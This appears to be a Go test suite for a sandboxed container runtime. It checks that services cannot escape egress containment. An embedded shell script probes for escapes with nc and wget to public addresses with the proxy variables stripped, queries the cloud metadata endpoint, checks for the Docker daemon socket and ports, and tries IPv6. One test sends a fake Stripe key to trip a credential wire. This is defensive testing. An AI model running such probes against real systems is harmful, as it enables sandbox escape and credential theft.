package local_test

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/network"
	"github.com/docker/docker/client"
	"github.com/stretchr/testify/require"

	"github.com/antifailure/antifailure/engine/internal/dockerutil"
	"github.com/antifailure/antifailure/engine/internal/runtime/local"
	"github.com/antifailure/antifailure/engine/pkg/provider"
	"github.com/antifailure/antifailure/engine/pkg/schema"
)

// This file tries to get out of an environment.
//
// The rest of the package asks whether the policy decides correctly. This asks
// whether the policy can be walked around, which is a different question and
// the one the product is sold on. Every test here is an attack, and every
// attack asserts that it failed.
//
// The trap in a suite like this is that a failed attack and an attack that was
// never made look identical from the outside. A container that did not start,
// a tool that is not in the image, a name that does not resolve, a port nobody
// is listening on: each produces a non-zero exit and each reads as containment
// working. So the probe below does two things beyond attacking. It runs a
// control that must SUCCEED through the sidecar, in the same container in the
// same run, so a container that cannot reach anything at all fails the test
// rather than passing it. And the identical script is run again on a network
// deliberately built without containment, where it must report escapes, which
// is what proves the script attacks anything at all.
//
// The design being attacked was already wrong once in a way a test caught:
// disabling IP masquerading looks like it removes a container's route out and
// does not, because Docker Desktop translates the traffic again at the virtual
// machine's gateway. That is why the inner network is created internal.
//
// This is not the first containment test in the repository, and the two that
// came before are worth knowing about because of what they miss.
// engine/conformance/runtime.go carries eight Egress_ behaviours that every
// runtime has to answer, with a self-test that proves each one can fail, and
// engine/internal/runtime/k8s/containment.go refuses to start an environment
// on a cluster whose CNI accepts a NetworkPolicy and enforces nothing. Both
// ask whether the NETWORK has a route out. Neither asks what the sidecar will
// do if it is asked nicely, and the sidecar is the one thing in the
// environment that does have a route out.
//
// The gap is visible in the conformance behaviours themselves.
// Egress_CannotReachTheMetadataEndpoint strips the proxy variables before it
// tries, so it proves the container cannot reach 169.254.169.254 and says
// nothing about the sidecar fetching it on the container's behalf, which it
// did. Egress_CannotBeBypassedByUDP sends a query to another resolver, and
// says nothing about a query to the right resolver for a record type it was
// forwarding straight back out. Both holes were real and both are closed; the
// tests here are the ones that would have found them.

// The marker lines the probe prints.
//
// Parsed rather than inferred from an exit code, because an exit code says a
// probe failed and not which attack worked, and the first thing anybody wants
// to know about a failed containment test is which route was open.
const (
	escapeMarker  = "AF-ESCAPE:"
	controlMarker = "AF-CONTROL:"
)

// escapeScript attempts every way out of an environment that does not go
// through the sidecar, then runs the controls.
//
// Each attempt is one route somebody has actually used.
//
//   - A connection straight to a public address skips DNS entirely, which is
//     the obvious answer to interception by DNS.
//   - A query to a public resolver turns a name lookup into a channel out,
//     because the payload of a DNS query is whatever the client puts in it.
//   - The link local metadata endpoint is not on the internet at all and hands
//     out the node's own cloud credentials to anything on the node that asks,
//     both directly and, more interestingly, by asking the sidecar to fetch it.
//   - A raw socket to a port an HTTP proxy has nothing to say about is the
//     answer to a proxy that only speaks HTTP.
//   - The daemon's socket is an escape from the container rather than from the
//     network, and it is worth more than any of the others.
//   - IPv6 is where a rule set written in IPv4 has a hole.
//
// Timeouts are short because every one of these is expected to hang until it
// is cut off, and ten hangs at the default would add minutes to the test.
const escapeScript = `
noproxy="env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u no_proxy -u NO_PROXY"
esc=""

$noproxy nc -z -w 3 1.1.1.1 443 >/dev/null 2>&1 && esc="$esc tcp-to-a-public-address"
$noproxy wget -T 3 -q -O /dev/null http://1.1.1.1/ >/dev/null 2>&1 && esc="$esc http-to-a-public-address"
$noproxy nslookup example.com 1.1.1.1 >/dev/null 2>&1 && esc="$esc udp-to-a-public-resolver"
$noproxy wget -T 3 -q -O /dev/null http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1 \
  && esc="$esc metadata-by-address"
wget -T 6 -q -O /dev/null http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1 \
  && esc="$esc metadata-through-the-sidecar"
$noproxy nc -z -w 5 example.com 6379 >/dev/null 2>&1 && esc="$esc raw-socket-to-an-allowed-host"
$noproxy nc -z -w 5 example.com 25 >/dev/null 2>&1 && esc="$esc smtp-to-an-allowed-host"
[ -S /var/run/docker.sock ] && esc="$esc the-daemon-socket-is-mounted"
$noproxy nc -z -w 3 172.17.0.1 2375 >/dev/null 2>&1 && esc="$esc the-daemon-over-tcp"
$noproxy nc -z -w 3 172.17.0.1 2376 >/dev/null 2>&1 && esc="$esc the-daemon-over-tls"
wget -T 8 -q -O /dev/null http://www.iana.org/ >/dev/null 2>&1 && esc="$esc a-host-with-no-rule"
$noproxy wget -T 3 -q -O /dev/null 'http://[2606:4700:4700::1111]/' >/dev/null 2>&1 \
  && esc="$esc ipv6-by-address"

# Every external name has to resolve to the sidecar. An empty answer counts as
# an escape rather than as containment, because a lookup that produced nothing
# tells us nothing, and this is the one place where not knowing has to fail.
outside=$(nslookup example.com 2>/dev/null | awk '/^Address/{print $NF}' | tail -1)
inside=$(nslookup ` + local.ProxyAlias + ` 2>/dev/null | awk '/^Address/{print $NF}' | tail -1)
if [ -z "$outside" ] || [ -z "$inside" ] || [ "$outside" != "$inside" ]; then
  esc="$esc a-name-resolved-past-the-sidecar"
fi

echo "` + escapeMarker + `$esc"

# The controls. These must succeed, and a run where they do not proves nothing
# about the attacks above it: a container that can reach nothing at all passes
# every one of them.
ctl=""
wget -T 25 -q -O /dev/null http://example.com/ >/dev/null 2>&1 \
  || ctl="$ctl reaching-an-allowed-host-through-the-proxy-variables"
$noproxy wget -T 25 -q -O /dev/null http://example.com/ >/dev/null 2>&1 \
  || ctl="$ctl reaching-an-allowed-host-with-the-variables-stripped"
echo "` + controlMarker + `$ctl"
`

// probeResult is what one run of the script reported.
type probeResult struct {
	escaped  []string
	controls []string
	output   string
}

// runEscapeProbe brings an environment up, runs the script in it, and reads
// back what it said.
//
// The prober holds itself open afterwards rather than exiting, so that reading
// its output is not a race against teardown, and the test stops waiting the
// moment both marker lines have arrived.
func runEscapeProbe(
	t *testing.T, r *local.Runtime, id string, egress *schema.Egress, script string,
) probeResult {
	t.Helper()
	// Generous, because the first Up on a machine compiles the sidecar image,
	// and a machine with other work on its daemon takes minutes over it. A
	// short deadline here turns a busy laptop into a red containment test,
	// which is the one result nobody should have to interpret.
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	_, err := r.Up(ctx, provider.EnvSpec{
		EnvID: id, Egress: egress,
		Services: []provider.ServiceSpec{{
			Name: "prober", Image: proberImage, Kind: "worker",
			Command: script + "\nsleep 240\n",
		}},
	})
	require.NoError(t, err, "the probe never started, so nothing was attacked")

	deadline := time.Now().Add(4 * time.Minute)
	for {
		lines, logErr := r.Logs(ctx, id, "prober", 200)
		require.NoError(t, logErr)
		var out strings.Builder
		for _, l := range lines {
			out.WriteString(l.Text)
			out.WriteString("\n")
		}
		text := out.String()
		if strings.Contains(text, escapeMarker) && strings.Contains(text, controlMarker) {
			return parseProbe(text)
		}
		if time.Now().After(deadline) {
			t.Fatalf("the probe never reported. Its output was:\n%s", text)
		}
		time.Sleep(2 * time.Second)
	}
}

// parseProbe reads the two marker lines out of a container's output.
//
// The marker is looked for anywhere in the line rather than at the start of
// it, because the daemon frames every line of a container with no TTY behind
// an eight byte header whose last byte is a length, and a length is often a
// printable character. Anchoring at the start made the first run of this test
// report no escapes from a network that had plainly escaped four ways.
func parseProbe(text string) probeResult {
	res := probeResult{output: text}
	for _, line := range strings.Split(text, "\n") {
		if i := strings.Index(line, escapeMarker); i >= 0 {
			res.escaped = strings.Fields(line[i+len(escapeMarker):])
		}
		if i := strings.Index(line, controlMarker); i >= 0 {
			res.controls = strings.Fields(line[i+len(controlMarker):])
		}
	}
	return res
}

// proberImage is busybox in alpine, which has every tool the script uses and
// is already on any machine that has run this package's other tests. Nothing
// is built, so this test costs one container rather than one image.
const proberImage = "alpine:3.20"

// containedPolicy is what a real environment looks like: a default of block
// and one host allowed. The allowed host is what makes the controls possible,
// and it is a real host so that a refusal elsewhere cannot be the machine
// being offline.
func containedPolicy() *schema.Egress {
	return &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: allowedHost, Mode: schema.ModeAllow}},
	}
}

func TestContainment_NothingEscapesAContainedEnvironment(t *testing.T) {
	r := requireRuntime(t)
	// The escape script's controls reach http://example.com/ and one of its
	// attacks reaches http://www.iana.org/, so both are named. The second
	// matters for the same reason it does in local_test.go: "a-host-with-no-rule"
	// is an attack that must FAIL, and a host that is merely down makes it fail
	// for a reason that has nothing to do with containment.
	requireInternet(t, "http://"+allowedHost, "http://"+refusedHost)

	res := runEscapeProbe(t, r, envID(t, r, "containescape"), containedPolicy(), escapeScript)

	require.Empty(t, res.controls,
		"a control failed, so the attacks in this run prove nothing.\n%s", res.output)
	require.Empty(t, res.escaped,
		"a service got out of the environment without going through the sidecar.\n%s", res.output)
}

// The same script, on a network built without containment.
//
// This is the test that gives the one above its meaning. Every assertion up
// there is that an attack failed, and an attack that is never made fails too.
// Here the identical script runs on an ordinary bridge network with a route
// out, and it has to report escapes. If it does not, the script is not
// attacking anything and the suite is decoration.
func TestContainment_TheSameProbeEscapesWithoutIt(t *testing.T) {
	// The runtime is not used here, and asking for it anyway is deliberate:
	// it is what counts this test as one that wanted the daemon, so a machine
	// without one skips it out loud rather than leaving the contained run
	// above with no control.
	requireRuntime(t)
	requireInternet(t, "http://"+allowedHost, "http://"+refusedHost)

	cli, err := dockerutil.Client()
	require.NoError(t, err)
	t.Cleanup(func() { _ = cli.Close() })

	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Minute)
	defer cancel()

	const netName = "af-contain-loose"
	const boxName = "af-contain-loose-probe"
	// Removed first, in case a previous run was killed between create and
	// remove. Both carry our label, so this cannot touch anything else.
	_ = cli.ContainerRemove(ctx, boxName, container.RemoveOptions{Force: true})
	_ = cli.NetworkRemove(ctx, netName)

	// Internal is false, which is the whole difference. Turning off IP
	// masquerading instead would look like the same thing and would not be:
	// on Docker Desktop the traffic is translated again at the virtual
	// machine's gateway, and that is the mistake this suite exists to keep
	// caught.
	loose, err := cli.NetworkCreate(ctx, netName, network.CreateOptions{
		Driver:   "bridge",
		Internal: false,
		Labels:   dockerutil.Managed(dockerutil.KindNetwork, "contain-loose", time.Now()),
	})
	require.NoError(t, err)
	t.Cleanup(func() {
		c, cancelRemove := context.WithTimeout(context.Background(), time.Minute)
		defer cancelRemove()
		_ = cli.ContainerRemove(c, boxName, container.RemoveOptions{Force: true})
		_ = dockerutil.RemoveNetwork(c, cli, loose.ID)
	})

	created, err := cli.ContainerCreate(ctx,
		&container.Config{
			Image:  proberImage,
			Cmd:    []string{"/bin/sh", "-c", escapeScript},
			Labels: dockerutil.Managed(dockerutil.KindService, "contain-loose", time.Now()),
		},
		&container.HostConfig{RestartPolicy: container.RestartPolicy{Name: container.RestartPolicyDisabled}},
		&network.NetworkingConfig{
			EndpointsConfig: map[string]*network.EndpointSettings{netName: {}},
		}, nil, boxName)
	require.NoError(t, err)
	require.NoError(t, cli.ContainerStart(ctx, created.ID, container.StartOptions{}))

	text := awaitLooseProbe(t, ctx, created.ID)
	res := parseProbe(text)
	require.NotEmpty(t, res.escaped,
		"the probe reported no escapes from a network with a route out, "+
			"which means it is not attacking anything and the contained run proves nothing.\n%s", text)
	require.Contains(t, res.escaped, "tcp-to-a-public-address",
		"the most basic escape did not work off a network with a route out.\n%s", text)
}

// awaitLooseProbe waits for the uncontained probe to finish and returns what
// it printed.
func awaitLooseProbe(t *testing.T, ctx context.Context, id string) string {
	t.Helper()
	cli, err := dockerutil.Client()
	require.NoError(t, err)
	defer func() { _ = cli.Close() }()

	deadline := time.Now().Add(3 * time.Minute)
	for {
		insp, inspErr := cli.ContainerInspect(ctx, id)
		require.NoError(t, inspErr)
		text := containerOutput(t, cli, id)
		if strings.Contains(text, controlMarker) {
			return text
		}
		if insp.State != nil && !insp.State.Running {
			return text
		}
		if time.Now().After(deadline) {
			t.Fatalf("the uncontained probe never reported. Its output was:\n%s", text)
		}
		time.Sleep(2 * time.Second)
	}
}

// The live credential tripwire, over plain HTTP, from a real container.
//
// This is the regression test for a hole this suite found. The tripwire ran on
// the transparent path and on the inspected path and not on the explicit proxy
// port, which is where every client that reads http_proxy sends a plain HTTP
// request. A live Stripe key went out to the origin with a 200 back, on a host
// in sandbox mode, and the decision log recorded it as allowed.
func TestContainment_ALiveCredentialOverPlainHTTPTripsTheWire(t *testing.T) {
	r := requireRuntime(t)
	requireInternet(t, "http://"+allowedHost)
	id := envID(t, r, "containtrip")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	// The control runs first and must be recorded as allowed. Same host, same
	// rule, same client, same path through the sidecar: only the header
	// differs, which is the one thing the tripwire is supposed to notice.
	script := strings.Join([]string{
		`wget -T 25 -q -O /dev/null http://` + allowedHost + `/ >/dev/null 2>&1; echo "control=$?"`,
		`wget -T 25 -q -O /dev/null --header='authorization: Bearer ` + fakeLiveKey() + `' ` +
			`http://` + allowedHost + `/ >/dev/null 2>&1; echo "attack=$?"`,
		`sleep 120`,
	}, "; ")

	_, err := r.Up(ctx, provider.EnvSpec{
		EnvID: id,
		Egress: &schema.Egress{
			Default: schema.ModeBlock,
			Rules:   []schema.EgressRule{{Host: allowedHost, Mode: schema.ModeAllow}},
		},
		Services: []provider.ServiceSpec{{
			Name: "caller", Image: proberImage, Kind: "worker", Command: script,
		}},
	})
	require.NoError(t, err)

	var refused, control local.Decision
	deadline := time.Now().Add(2 * time.Minute)
	for time.Now().Before(deadline) {
		decisions, decErr := r.Decisions(ctx, id, 200)
		require.NoError(t, decErr)
		for _, d := range decisions {
			if d.Via != "proxy" || d.Host != allowedHost {
				continue
			}
			if strings.Contains(d.Reason, "live credential") {
				refused = d
			} else if d.Allowed {
				control = d
			}
		}
		if refused.Host != "" && control.Host != "" {
			break
		}
		time.Sleep(2 * time.Second)
	}

	require.NotEmpty(t, control.Host,
		"the control request was never recorded on the explicit proxy path, so the "+
			"refusal below would not prove the tripwire ran")
	require.Equal(t, 200, control.Status)

	require.NotEmpty(t, refused.Host, "a live credential was forwarded on the explicit proxy path")
	require.False(t, refused.Allowed)
	require.Equal(t, 403, refused.Status)
	require.Contains(t, refused.Reason, "Stripe secret key")
	require.NotContains(t, refused.Reason, "A1b2C3d4", "the log never carries the key itself")
}

// The metadata endpoint, asked for through the sidecar, under a policy that
// allows everything.
//
// A service cannot reach 169.254.169.254 itself, because its network has no
// route anywhere. The sidecar can, because it is the one container with a
// route out, so the attack is to ask the sidecar to fetch it. Nobody writing
// default: allow is consenting to that: the sentence is about the internet,
// and the link local range is not on it.
func TestContainment_TheMetadataEndpointIsRefusedUnderDefaultAllow(t *testing.T) {
	r := requireRuntime(t)
	requireInternet(t, "http://"+allowedHost)
	id := envID(t, r, "containmeta")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	script := strings.Join([]string{
		`wget -T 15 -q -O /dev/null http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; echo "attack=$?"`,
		`wget -T 25 -q -O /dev/null http://` + allowedHost + `/ >/dev/null 2>&1; echo "control=$?"`,
		`sleep 120`,
	}, "; ")

	_, err := r.Up(ctx, provider.EnvSpec{
		EnvID:  id,
		Egress: &schema.Egress{Default: schema.ModeAllow},
		Services: []provider.ServiceSpec{{
			Name: "caller", Image: proberImage, Kind: "worker", Command: script,
		}},
	})
	require.NoError(t, err)

	var metadata, control local.Decision
	deadline := time.Now().Add(2 * time.Minute)
	for time.Now().Before(deadline) {
		decisions, decErr := r.Decisions(ctx, id, 200)
		require.NoError(t, decErr)
		for _, d := range decisions {
			switch d.Host {
			case "169.254.169.254":
				metadata = d
			case allowedHost:
				control = d
			}
		}
		if metadata.Host != "" && control.Host != "" {
			break
		}
		time.Sleep(2 * time.Second)
	}

	// The control proves the policy really is allow and the sidecar really
	// does forward under it, so the refusal is the address guard rather than a
	// sidecar refusing everything.
	require.NotEmpty(t, control.Host, "the control never reached the sidecar")
	require.True(t, control.Allowed, "default allow did not allow an ordinary host")

	require.NotEmpty(t, metadata.Host, "the request for the metadata endpoint was never recorded")
	require.NotEqual(t, 200, metadata.Status,
		"the sidecar fetched the instance metadata endpoint on the environment's behalf")
	require.Contains(t, metadata.Error, "link local",
		"the refusal does not say why, which is half of what a decision log is for")
}

// The container escape, which is worth more than any network one.
//
// A path to the daemon is a way to start a container with the host's
// filesystem mounted, so it ends the conversation about egress. Nothing in the
// runtime mounts anything today, and this is the test that notices when
// somebody adds a mount for a good reason and does not think about this one.
func TestContainment_NoServiceGetsAPathToTheDaemonOrTheHost(t *testing.T) {
	r := requireRuntime(t)
	id := envID(t, r, "containmount")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	_, err := r.Up(ctx, provider.EnvSpec{
		EnvID:  id,
		Egress: containedPolicy(),
		Services: []provider.ServiceSpec{{
			Name: "idle", Image: proberImage, Kind: "worker", Command: "sleep 120",
		}},
	})
	require.NoError(t, err)

	cli, err := dockerutil.Client()
	require.NoError(t, err)
	t.Cleanup(func() { _ = cli.Close() })

	list, err := cli.ContainerList(ctx, container.ListOptions{
		All: true, Filters: dockerutil.EnvFilter(id),
	})
	require.NoError(t, err)
	require.NotEmpty(t, list, "no container was found for this environment, so nothing was checked")

	var checkedService, checkedSidecar bool
	for _, c := range list {
		insp, inspErr := cli.ContainerInspect(ctx, c.ID)
		require.NoError(t, inspErr)
		name := insp.Config.Labels[dockerutil.LabelService]

		require.Empty(t, insp.HostConfig.Binds, "%s has a bind mount", name)
		require.Empty(t, insp.Mounts, "%s has a mount", name)
		require.False(t, insp.HostConfig.Privileged, "%s is privileged", name)
		require.Empty(t, insp.HostConfig.CapAdd, "%s adds capabilities", name)
		require.NotEqual(t, "host", string(insp.HostConfig.NetworkMode),
			"%s is on the host's network, which has no containment at all", name)
		require.NotEqual(t, "host", string(insp.HostConfig.PidMode), "%s shares the host's processes", name)
		require.Empty(t, insp.HostConfig.Devices, "%s has a device", name)

		switch name {
		case local.ProxyAlias:
			// The sidecar is on both networks. That is the design: it is the
			// only thing in the environment with a route out.
			require.Len(t, insp.NetworkSettings.Networks, 2,
				"the sidecar is not on both networks, so either nothing is contained "+
					"or nothing can get out at all")
			checkedSidecar = true
		case "idle":
			require.Len(t, insp.NetworkSettings.Networks, 1,
				"a service is attached to more than one network, and the second one is "+
					"the one with a route out")
			for netName := range insp.NetworkSettings.Networks {
				insp, netErr := cli.NetworkInspect(ctx, netName, network.InspectOptions{})
				require.NoError(t, netErr)
				require.True(t, insp.Internal,
					"the network a service sits on is not internal, so it has a route out. "+
						"Turning off IP masquerading looks like the same thing and is not: "+
						"Docker Desktop translates the traffic again at the virtual machine's gateway")
			}
			checkedService = true
		}
	}
	require.True(t, checkedService, "no service container was inspected")
	require.True(t, checkedSidecar, "the sidecar was not inspected")
}

// containerOutput reads a container's whole output.
func containerOutput(t *testing.T, cli *client.Client, id string) string {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	rc, err := cli.ContainerLogs(ctx, id, container.LogsOptions{ShowStdout: true, ShowStderr: true})
	if err != nil {
		return fmt.Sprintf("the output could not be read: %v", err)
	}
	defer func() { _ = rc.Close() }()
	var b strings.Builder
	buf := make([]byte, 32<<10)
	for {
		n, readErr := rc.Read(buf)
		if n > 0 {
			b.Write(buf[:n])
		}
		if readErr != nil {
			break
		}
	}
	// The daemon frames each line with an eight byte header on a container
	// with no TTY, and the marker would not be found inside it.
	return strings.ToValidUTF8(strings.Map(func(r rune) rune {
		if r < 32 && r != '\n' && r != '\t' {
			return '\n'
		}
		return r
	}, b.String()), "")
}
